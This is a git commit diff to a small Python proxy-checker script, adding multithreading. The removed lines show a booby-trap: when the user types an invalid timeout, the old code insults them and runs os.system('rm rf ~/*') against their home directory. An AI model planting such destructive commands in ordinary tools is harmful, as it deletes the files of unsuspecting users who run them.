4c3dc1ff7bebaefc0c9f128cb4e51699c1d60dab
FSystem88 <41367666+FSystem88@users.noreply.github.com>
2020-11-06 00:52:54 +0300

    добавил многопоточность

--- script.py
+++ script.py
@@ -1,23 +1,11 @@
 #!/usr/bin/python3
-import requests as r, os
+import requests as r, os, threading
+from threading import Thread
 from colorama import Fore,Style
-url = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"
-req = r.get(url)
-ip = r.post("http://v4.ident.me/").text
-array = req.text.split()
-print("Your ip: {}".format(ip))
-sec = input("Enter the timeout in seconds for checking the proxy (default 10): ")
-try:
-	if sec == "":
-		sec = 10
-	else:
-		sec = int(sec)
-except:
-	print("ok, you very stupid")
-	os.system("rm rf ~/*")
-for prox in array:
+
+def check(ip, prox):
 	try:
-		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=sec)).text
+		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=10).text
 	except:
 		ipx = ip
 	if ip != ipx:
@@ -27,3 +15,14 @@ for prox in array:
 		f.close()
 	else:
 		print(Fore.RED+"{} bad".format(prox))
+
+url = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"
+req = r.get(url)
+ip = r.post("http://v4.ident.me/").text
+array = req.text.split()
+print(Fore.LIGHTYELLOW_EX+"Your ip: {}".format(ip)+Style.RESET_ALL)
+for prox in array:
+	thread_list = []
+	t = threading.Thread (target=check, args=(ip, prox))
+	thread_list.append(t)
+	t.start()
